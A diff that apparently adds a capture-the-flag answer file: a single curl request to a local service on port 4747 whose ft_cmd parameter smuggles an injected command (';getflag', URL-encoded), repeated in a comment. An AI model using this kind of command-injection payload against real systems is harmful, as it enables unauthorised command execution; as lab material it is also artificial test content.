@@ -1,0 +1,3 @@
+curl http://127.0.0.1:4747/?ft_cmd=%3Bgetflag
+
+# ;getflag
